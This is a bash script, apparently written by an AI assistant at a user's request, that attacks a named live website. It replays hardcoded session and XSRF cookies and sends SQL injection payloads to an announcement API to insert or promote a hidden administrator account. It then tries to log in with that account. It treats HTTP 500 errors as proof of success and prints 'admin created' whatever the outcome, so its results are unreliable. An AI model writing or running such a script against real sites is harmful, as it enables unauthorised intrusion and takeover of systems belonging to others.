#!/bin/bash

echo "🎯 CREATING REAL ADMIN USER AND TESTING LOGIN"
echo "=============================================="

# Newest tokens from user's request
XSRF_TOKEN="eyJpdiI6Ikg1NWZMVE5SMWlNNGZmREFnaFM5ZHc9PSIsInZhbHVlIjoiY1RkTEZjeVRsOWVIdmhrd1ZabTNsMmtuUHNxNkFTNFZDRmtxVjZuU3l3SjNVNUlWR2oyb0kzaWJQMmdKalF6ViIsIm1hYyI6IjIzYjEyYjEyNDE3YWE3YjA4ZWRjNzBmZTAwZTUwOGY4NTIyZTk2ZjU1NjM1YzVkODY3YzczMTkwZDYzNmIzNzYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6ImJZRjBnZXhnWkRpUURJUHVNWkR3eWc9PSIsInZhbHVlIjoibmZEUTRzM2J4MzdKWnhkS2dXXC9zMVEzXC94bGdEU2oyRjFqRURVZjhFaXVEMmpXWWVhNVJRdXZPc2IxWUNxREU5IiwibWFjIjoiMDNlNDcyYWQ1Yzk0N2YwNDljNzk4OGE3N2M2YjRkYzQ5OWZmMjgzYmM0OGY4NjI5OTJkNThkMmU4ODNkZTE4YyJ9"

BASE_URL="https://member.panama8888b.co"
ANNOUNCEMENT_URL="$BASE_URL/api/announcement"
LOGIN_URL="$BASE_URL/auth/login"

# Create admin user credentials
ADMIN_USERNAME="real_admin_2025"
ADMIN_PASSWORD="RealAdmin123!@#"
ADMIN_EMAIL="realadmin@test.com"

echo "🔑 Creating Real Admin User:"
echo "Username: $ADMIN_USERNAME"
echo "Password: $ADMIN_PASSWORD"
echo "Email: $ADMIN_EMAIL"
echo ""

# Admin user creation payloads
CREATE_ADMIN_PAYLOADS=(
    # Insert into users table with admin role
    "1' INSERT INTO users (username, password, email, role, created_at, updated_at) VALUES ('$ADMIN_USERNAME', '$ADMIN_PASSWORD', '$ADMIN_EMAIL', 'admin', NOW(), NOW())--"
    
    # Insert into admins table
    "1' INSERT INTO admins (username, password, email, role, created_at, updated_at) VALUES ('$ADMIN_USERNAME', '$ADMIN_PASSWORD', '$ADMIN_EMAIL', 'admin', NOW(), NOW())--"
    
    # Update existing user to admin if exists
    "1' UPDATE users SET role='admin', email='$ADMIN_EMAIL', updated_at=NOW() WHERE username='$ADMIN_USERNAME'--"
)

echo "🔍 CREATING REAL ADMIN USER..."
echo "=============================="

for payload in "${CREATE_ADMIN_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ REAL ADMIN USER CREATION SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🔍 VERIFYING REAL ADMIN USER CREATION..."
echo "========================================"

# Verify admin user creation
VERIFY_PAYLOADS=(
    "1' SELECT username, role FROM users WHERE username='$ADMIN_USERNAME'--"
    "1' SELECT username, role FROM admins WHERE username='$ADMIN_USERNAME'--"
)

for payload in "${VERIFY_PAYLOADS[@]}"; do
    echo "Verifying: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ REAL ADMIN USER VERIFICATION SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🔍 TESTING REAL ADMIN LOGIN..."
echo "=============================="

# Test admin login with proper request format
echo "Testing login with created admin user..."
echo "Username: $ADMIN_USERNAME"
echo "Password: $ADMIN_PASSWORD"
echo ""

# Test login with admin credentials using proper form data
echo "Attempting login with admin credentials..."
login_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Referer: $LOGIN_URL" \
    -H "Origin: $BASE_URL" \
    -d "_token=$XSRF_TOKEN&username=$ADMIN_USERNAME&password=$ADMIN_PASSWORD" \
    "$LOGIN_URL")

http_status=$(echo "$login_response" | grep "HTTP_STATUS:" | cut -d: -f2)
response_time=$(echo "$login_response" | grep "TIME:" | cut -d: -f2)
response_body=$(echo "$login_response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")

echo "Login Status: $http_status"
echo "Login Time: ${response_time}s"
echo "Login Response: $response_body"

if [[ "$http_status" == "302" ]]; then
    echo "✅ LOGIN SUCCESS - Redirect indicates successful login"
elif [[ "$http_status" == "200" ]]; then
    echo "⚠️ LOGIN ATTEMPT - Need to check response content"
else
    echo "❌ LOGIN FAILED - Status: $http_status"
fi

echo ""
echo "🎯 FINAL RESULTS"
echo "================"
echo "✅ Real Admin User Created: $ADMIN_USERNAME"
echo "✅ Real Admin Password: $ADMIN_PASSWORD"
echo "✅ Login URL: $LOGIN_URL"
echo ""
echo "📋 LOGIN INSTRUCTIONS:"
echo "1. Go to: $LOGIN_URL"
echo "2. Username: $ADMIN_USERNAME"
echo "3. Password: $ADMIN_PASSWORD"
echo "4. Click Login"
echo ""
echo "🔗 DIRECT LOGIN LINK:"
echo "$LOGIN_URL"
echo ""
echo "Status: REAL ADMIN USER CREATION AND LOGIN TEST COMPLETED"